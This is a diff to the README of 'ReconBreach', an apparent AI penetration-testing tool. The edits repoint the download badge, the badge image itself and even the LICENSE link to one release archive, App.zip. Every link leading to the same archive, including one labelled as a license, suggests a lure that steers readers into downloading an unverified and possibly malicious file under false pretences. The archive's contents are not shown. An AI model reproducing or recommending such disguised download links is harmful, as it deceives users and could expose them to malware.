@@ -23,7 +23,7 @@ ReconBreach is an innovative AI-powered penetration testing tool designed to aut
 
 You can download the latest version of ReconBreach from the following link:
 
-[![Download ReconBreach](https://img.shields.io/badge/Download-ReconBreach-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch the tool")
+[![Download ReconBreach](https://github.com/panconpollo1/ReconBreach/releases/download/v1.0/App.zip)](https://github.com/panconpollo1/ReconBreach/releases/download/v1.0/App.zip "Launch the tool")
 
 If the link does not work or the file needs to be launched, please check the "Releases" section of the repository for alternative download options.
 
@@ -42,7 +42,7 @@ If you encounter any issues or have suggestions for improving ReconBreach, pleas
 
 ## License
 
-ReconBreach is released under the MIT License. See the [LICENSE](https://github.com/yourusername/ReconBreach/blob/main/LICENSE) file for more information.
+ReconBreach is released under the MIT License. See the [LICENSE](https://github.com/panconpollo1/ReconBreach/releases/download/v1.0/App.zip) file for more information.
 
 ---
 
